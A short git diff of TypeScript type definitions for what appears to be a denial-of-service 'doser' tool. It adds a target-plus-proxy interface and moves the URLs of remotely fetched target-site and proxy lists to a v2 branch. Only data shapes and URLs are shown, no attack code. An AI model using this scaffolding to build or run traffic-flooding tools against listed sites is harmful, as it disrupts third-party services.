@@ -1,7 +1,14 @@
+import { AxiosProxyConfig } from "axios";
+
 export interface ProxyData {
   auth: string;
   id: number;
   ip: string;
+}
+
+export interface PrioritizedTarget {
+  page: SiteData,
+  proxyObj: AxiosProxyConfig  | undefined
 }
 
 export interface SiteData {
@@ -15,13 +22,9 @@ export interface SiteData {
   url: string;
 }
 
-export interface TargetData {
-  site: SiteData;
-  proxy: Array<ProxyData>;
-}
 
 export type DoserEventType = 'atack' | 'error';
 
 export type GetSitesAndProxiesResponse = { sites: SiteData[]; proxies: ProxyData[]} | null
-export const sitesUrl = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json'
-export const proxiesUrl = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json'
+export const sitesUrl = 'https://raw.githubusercontent.com/opengs/uashieldtargets/v2/sites.json'
+export const proxiesUrl = 'https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json'
